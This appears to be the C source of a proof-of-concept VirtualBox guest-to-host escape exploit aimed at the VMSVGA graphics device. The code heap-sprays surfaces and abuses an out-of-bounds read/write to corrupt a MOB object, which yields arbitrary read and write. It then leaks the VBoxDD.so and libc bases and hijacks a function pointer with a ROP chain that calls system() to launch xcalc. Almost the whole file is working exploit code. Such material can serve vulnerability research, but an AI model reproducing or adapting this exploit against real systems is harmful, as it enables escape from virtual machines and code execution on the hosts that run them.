#include <stdio.h>
#include <unistd.h>
#include <fcntl.h> // open
#include <stdlib.h> // calloc
#include <string.h> // memset
#include <sys/ioctl.h> // ioctl

#include "code_helper.h"
#include "vmsvga.h"
#include "dma.h"

#define PAGE_SIZE 0x1000

typedef struct exp_context {
    uint64_t virt_addr;
    uint64_t phys_addr;
    uint8_t *buf;
    uint64_t buf_size;

    uint32_t trans_sid;
    uint32_t buggy_sid;

    uint8_t *oob_mob_buf;
    uint64_t oob_mob_buf_size;
    VMSVGAMOB *oob_mob;
    uint32_t oob_mobid;

    uint32_t oob_cid;
    SVGACOTableType oob_ctype;
} exp_context_t;

int init_dma(exp_context_t *ctx) {
    int rc = 0;

    ctx->buf_size = PAGE_SIZE;

    rc = dma_alloc(ctx->buf_size, &ctx->virt_addr, &ctx->phys_addr);
    if (rc != 0) {
        die("%s: dma_alloc faild.", __func__);
        return -1;
    }
    ctx->buf = calloc(ctx->buf_size, sizeof(uint8_t));

    success("dma: buf %#llx, phys %#llx, virt %#llx",
        ctx->buf, ctx->phys_addr, ctx->virt_addr);
    return 0;
}

int heap_spray(exp_context_t *ctx) {
    int rc = 0;
    uint32_t i = 0;
    int done = 0;

    for (i = 0x10; i < 0x1000 && !done; i++) {
        info("%s: try id %#x" ,__func__, i);
        // alloc buggy surface
        rc = define_gb_surface(i, SVGA3D_NV12, ctx->buf_size, 0xffffffff, 1);
        if (rc != 0) {
            die("%s: define_gb_surface faild.", __func__);
            return -1;
        }
        rc = surface_dma(i);
        if (rc != 0) {
            die("%s: surface_dma faild.", __func__);
            return -1;
        }
        rc = define_gb_mob(i, ctx->phys_addr, 0x01421337);
        if (rc != 0) {
            die("%s: define_gb_mob faild.", __func__);
            return -1;
        }
        // trigger oob read
        rc = dx_buffer_copy(i, ctx->trans_sid, 0x100);
        if (rc != 0) {
            die("%s: dx_buffer_copy faild.", __func__);
            return -1;
        }
        // readback
        rc = dx_readback_subresource(ctx->trans_sid);
        if (rc != 0) {
            die("%s: dx_readback_subresource faild.", __func__);
            return -1;
        }
        sleep(1);
        rc = dma_read(0x100, ctx->virt_addr, ctx->buf);
        if (rc != 0) {
            die("%s: dma_read faild.", __func__);
            return -1;
        }
        //hex_dump64(ctx->buf, 0x20+0x48);
        // check if done
        for (int j = 0x20; j < 0x20+0x48 && !done; j += 4) {
            if (*(uint32_t *)(&ctx->buf[j]) == 0x01421337) {
                ctx->buggy_sid = i;
                ctx->oob_mob_buf_size = j + 0x18;
                ctx->oob_mob_buf = (uint8_t *)calloc(ctx->oob_mob_buf_size, sizeof(uint8_t));
                memcpy(ctx->oob_mob_buf, ctx->buf, ctx->oob_mob_buf_size);
                ctx->oob_mob = (VMSVGAMOB *)(ctx->oob_mob_buf + j - 0x30);
                ctx->oob_mobid = ctx->oob_mob->Core.Key;
                done = 1;
            }
        }
    }

    if (!done) {
        return -1;
    }
    return 0;
}

int oob_read(exp_context_t *ctx) {
    int rc = -1;

    // trigger oob read
    rc = dx_buffer_copy(ctx->buggy_sid, ctx->trans_sid, ctx->oob_mob_buf_size);
    if (rc != 0) {
        die("%s: dx_buffer_copy faild.", __func__);
        return -1;
    }
    // readback
    rc = dx_readback_subresource(ctx->trans_sid);
    if (rc != 0) {
        die("%s: dx_readback_subresource faild.", __func__);
        return -1;
    }
    sleep(1);
    rc = dma_read(ctx->oob_mob_buf_size, ctx->virt_addr, ctx->buf);
    if (rc != 0) {
        die("%s: dma_read faild.", __func__);
        return -1;
    }
    memcpy(ctx->oob_mob_buf, ctx->buf, ctx->oob_mob_buf_size);

    return 0;
}

int oob_write(exp_context_t *ctx, uint8_t *buf, uint64_t size) {
    int rc = -1;
    uint32_t tmp_mobid = 0xb;

    rc = dma_write(size, buf, ctx->virt_addr);
    if (rc != 0) {
        die("%s: dma_write faild.", __func__);
        return -1;
    }
    rc = define_gb_mob(tmp_mobid, ctx->phys_addr, size);
    if (rc != 0) {
        die("%s: define_gb_mob faild.", __func__);
        return -1;
    }
    rc = bind_gb_surface(tmp_mobid, ctx->buggy_sid);
    if (rc != 0) {
        die("%s: bind_gb_surface faild.", __func__);
        return -1;
    }
    rc = dx_update_subresource(ctx->buggy_sid, size);
    if (rc != 0) {
        die("%s: dx_update_subresource faild.", __func__);
        return -1;
    }

    rc = destroy_gb_mob(tmp_mobid);
    if (rc != 0) {
        die("%s: destroy_gb_mob faild.", __func__);
        return -1;
    }
    return 0;
}

int abread(exp_context_t *ctx, uint64_t target, uint32_t size) {
    int rc = -1;

    //info("read %#lx", target);

    /* update mob status */
    rc = oob_read(ctx);
    if (rc != 0) {
        die("%s: oob_read faild.", __func__);
        return -1;
    }

    /* overwrite mob */
    ctx->oob_mob->Gbo.pvHost = (void *)target;
	ctx->oob_mob->Gbo.cbTotal = size;
    ctx->oob_mob->Gbo.cTotalPages = (size>>12) + 1;
    ctx->oob_mob->Gbo.fGboFlags |= VMSVGAGBO_F_HOST_BACKED;
    rc = oob_write(ctx, ctx->oob_mob_buf, ctx->oob_mob_buf_size);
    if (rc != 0) {
        die("%s: oob_write faild.", __func__);
        return -1;
    }

    /* readback Gbo.pvHost */
    rc = dx_readback_cotable(ctx->oob_cid, ctx->oob_ctype);
    if (rc != 0) {
        die("%s: dx_readback_cotable faild.", __func__);
        return -1;
    }
    sleep(1);
    rc = dma_read(size, ctx->virt_addr, ctx->buf);
    if (rc != 0) {
        die("%s: dma_read faild.", __func__);
        return -1;
    }
    return 0;
}

int abwrite(exp_context_t *ctx, uint8_t *buf, uint64_t target, uint32_t size) {
    int rc = -1;

    /* update mob status */
    rc = oob_read(ctx);
    if (rc != 0) {
        die("%s: oob_read faild.", __func__);
        return -1;
    }
    memcpy(ctx->oob_mob_buf, ctx->buf, ctx->oob_mob_buf_size);

    /* overwrite mob */
    ctx->oob_mob->Gbo.pvHost = (void *)target;
	ctx->oob_mob->Gbo.cbTotal = size;	
    ctx->oob_mob->Gbo.fGboFlags |= VMSVGAGBO_F_HOST_BACKED;
    rc = oob_write(ctx, ctx->oob_mob_buf, ctx->oob_mob_buf_size);
    if (rc != 0) {
        die("%s: oob_write faild.", __func__);
        return -1;
    }

    /* write to Gbo.pvHost */
    rc = dma_write(size, buf, ctx->virt_addr);
    if (rc != 0) {
        die("%s: dma_write faild.", __func__);
        return -1;
    }
    rc = dx_grow_cotable(ctx->oob_cid, ctx->oob_mobid, ctx->oob_ctype, size);
    if (rc != 0) {
        die("%s: dx_grow_cotable faild.", __func__);
        return -1;
    }
    return 0;
}

int main(int argc, char *argv[]) {
    int rc = -1;
    exp_context_t ctx = { 0, };

    /* alloc dma buffer */
    rc = init_dma(&ctx);
    if (rc != 0) {
        die("%s: init_dma faild.", __func__);
        return -1;
    }

    /* alloc transfer surface */
    ctx.trans_sid = 0xa;
    rc = define_gb_surface(ctx.trans_sid, SVGA3D_LUMINANCE8, ctx.buf_size, 1, 1);
    if (rc != 0) {
        die("%s: define_gb_surface faild.", __func__);
        return -1;
    }
    rc = define_gb_mob(ctx.trans_sid, ctx.phys_addr, ctx.buf_size);
    if (rc != 0) {
        die("%s: define_gb_mob faild.", __func__);
        return -1;
    }
    rc = bind_gb_surface(ctx.trans_sid, ctx.trans_sid);
    if (rc != 0) {
        die("%s: bind_gb_surface faild.", __func__);
        return -1;
    }
    success("alloc transfer surface sid = %#x", ctx.trans_sid);

    /* heap spray */
    rc = heap_spray(&ctx);
    if (rc != 0) {
        die("%s: heap_spray faild.", __func__);
        return -1;
    }
    success("heap spray success! buggy_sid = %#x, oob_mobid = %#x",
        ctx.buggy_sid, ctx.oob_mobid);

    /* prepare for abread, create and bind context with oob_mob */
    ctx.oob_cid = 0x42;
    ctx.oob_ctype = SVGA_COTABLE_RTVIEW;
    rc = dx_define_context(ctx.oob_cid);
    if (rc != 0) {
        die("%s: dx_define_context faild.", __func__);
        return -1;
    }
    rc = dx_grow_cotable(ctx.oob_cid, ctx.oob_mobid, ctx.oob_ctype, 0x1337);
    if (rc != 0) {
        die("%s: dx_grow_cotable faild.", __func__);
        return -1;
    }
    
    /* leak &pSvgaR3State->MOBLRUList */
    uint64_t pSvgaR3State = 0;
    rc = oob_read(&ctx);
    if (rc != 0) {
        die("%s: oob_read faild.", __func__);
        return -1;
    }
    //hex_dump64(ctx.oob_mob, sizeof(VMSVGAMOB));
    pSvgaR3State = (uint64_t)ctx.oob_mob->nodeLRU.pPrev - 0x11D0;
    success("leak pSvgaR3State = %#llx", pSvgaR3State);

    /* leak pSvgaR3State->pFuncsVGPU9 */
    uint64_t pFuncsVGPU9 = 0;
    rc = abread(&ctx, pSvgaR3State+0x11f0, 8);
    if (rc != 0) {
        die("%s: abread faild.", __func__);
        return -1;
    }
    //hex_dump64(ctx.buf, 8);
    pFuncsVGPU9 = *(uint64_t *)ctx.buf;
    success("leak pFuncsVGPU9 = %#llx", pFuncsVGPU9);

    /* leak VBoxDD.so base */
    uint64_t pfnSetLightData = 0;
    rc = abread(&ctx, pFuncsVGPU9+0x40, 8); // pSvgaR3State->pFuncsVGPU9->pfnSetLightData
    if (rc != 0) {
        die("%s: abread faild.", __func__);
        return -1;
    }
    //hex_dump64(ctx.buf, 8);
    pfnSetLightData = *(uint64_t *)ctx.buf;
    success("leak pfnSetLightData = %#llx", pfnSetLightData);
    
    /* leak libc.so base */
    uint64_t VBoxDD_base = pfnSetLightData - 0x231454,
             libc_base = 0;
    rc = abread(&ctx, VBoxDD_base+0x721F58, 8); // stderr.got
    if (rc != 0) {
        die("%s: abread faild.", __func__);
        return -1;
    }
    //hex_dump64(ctx.buf, 8);
    libc_base = *(uint64_t *)ctx.buf - 0x2046a0;
    success("leak libc_base = %#llx", libc_base);

    uint64_t gg1 = libc_base + 0x00000000000a570a, /* mov rdi, qword ptr [rcx + 8] ; call qword ptr [rcx] */
             gg2 = libc_base + 0x000000000008daab; /* call qword ptr [rcx + 0x48] */
    uint64_t system_addr = libc_base + 0x58750;
    uint8_t *cmd = "/usr/bin/xcalc";
    uint64_t cmd_addr = VBoxDD_base+0x0000000000DB9A00;

    /* write cmd */
    rc = abwrite(&ctx, cmd, cmd_addr, strlen(cmd)+1);
    if (rc != 0) {
        die("%s: abwrite faild.", __func__);
        return -1;
    }
    /* overwrite pSvgaR3State->pFuncsVGPU9->pfnSetLightData */
    rc = abwrite(&ctx, (uint8_t *)&gg2, pFuncsVGPU9+0x40, 8); // pSvgaR3State->pFuncsVGPU9->pfnSetLightData
    if (rc != 0) {
        die("%s: abwrite faild.", __func__);
        return -1;
    }
    
    /* trigger rop */
    uint64_t rop[0x100/8] = { 0,};
    rop[0] = system_addr;
    rop[1] = cmd_addr;
    rop[0x48/8] = gg1;
    setlightdata((uint8_t *)rop, 0x100);

    return 0;
}